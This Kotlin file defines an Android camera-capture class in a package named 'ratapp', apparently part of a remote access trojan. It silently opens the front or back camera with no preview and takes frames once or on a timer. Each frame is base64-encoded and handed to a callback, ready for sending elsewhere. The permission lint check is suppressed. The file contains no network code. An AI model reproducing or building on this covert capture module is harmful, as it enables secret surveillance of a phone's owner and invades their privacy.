package com.ratio.ratapp

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Size
import java.nio.ByteBuffer

class CameraCap(private val ctx: Context) {

    private val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private var device: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var reader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null

    private var streaming = false
    private var intervalMs = 1000L
    private var lastTs = 0L
    private var onFrame: ((String) -> Unit)? = null

    private fun cameraId(facing: String): String? {
        for (id in cm.cameraIdList) {
            val ch = cm.getCameraCharacteristics(id)
            val f = ch.get(CameraCharacteristics.LENS_FACING) ?: continue
            if (facing == "front" && f == CameraCharacteristics.LENS_FACING_FRONT) return id
            if (facing == "back" && f == CameraCharacteristics.LENS_FACING_BACK) return id
        }
        return cm.cameraIdList.firstOrNull()
    }

    private fun sizeFor(id: String): Size {
        val ch = cm.getCameraCharacteristics(id)
        val map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ?: return Size(640, 480)
        val sizes = map.getOutputSizes(ImageFormat.JPEG) ?: return Size(640, 480)
        return sizes.filter { it.width <= 960 }.maxByOrNull { it.width * it.height } ?: sizes[0]
    }

    @SuppressLint("MissingPermission")
    private fun open(facing: String, cb: (Boolean) -> Unit) {
        close()
        val id = cameraId(facing) ?: return cb(false)
        thread = HandlerThread("cam").also { it.start() }
        handler = Handler(thread!!.looper)
        val sz = sizeFor(id)
        reader = ImageReader.newInstance(sz.width, sz.height, ImageFormat.JPEG, 2)
        reader!!.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val buf: ByteBuffer = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining())
                buf.get(bytes)
                val now = System.currentTimeMillis()
                if (now - lastTs >= intervalMs) {
                    lastTs = now
                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    onFrame?.invoke(b64)
                }
            } finally { img.close() }
        }, handler)

        cm.openCamera(id, object : CameraDevice.StateCallback() {
            override fun onOpened(cam: CameraDevice) { device = cam; cb(true) }
            override fun onDisconnected(cam: CameraDevice) { cam.close(); cb(false) }
            override fun onError(cam: CameraDevice, error: Int) { cam.close(); cb(false) }
        }, handler)
    }

    private fun createSession() {
        val cam = device ?: return
        val surf = reader?.surface ?: return
        cam.createCaptureSession(listOf(surf), object : CameraCaptureSession.StateCallback() {
            override fun onConfigured(s: CameraCaptureSession) {
                session = s
                repeatRequest()
            }
            override fun onConfigureFailed(s: CameraCaptureSession) {}
        }, handler)
    }

    private fun repeatRequest() {
        val cam = device ?: return
        val s = session ?: return
        val surf = reader?.surface ?: return
        val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
            addTarget(surf)
            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
        }.build()
        try { s.setRepeatingRequest(req, null, handler) } catch (_: Throwable) {}
    }

    fun startStream(facing: String, intervalMs: Int, onFrame: (String) -> Unit) {
        this.intervalMs = intervalMs.toLong()
        this.onFrame = onFrame
        this.streaming = true
        open(facing) { ok -> if (ok) createSession() }
    }

    fun stop() {
        streaming = false
        onFrame = null
        close()
    }

    fun captureOnce(facing: String, cb: (String) -> Unit) {
        this.onFrame = { b64 -> cb(b64); stop() }
        this.intervalMs = 0
        this.lastTs = 0
        open(facing) { ok -> if (ok) createSession() }
    }

    private fun close() {
        try { session?.close() } catch (_: Throwable) {}
        try { device?.close() } catch (_: Throwable) {}
        try { reader?.close() } catch (_: Throwable) {}
        thread?.quitSafely()
        session = null; device = null; reader = null; thread = null; handler = null
    }
}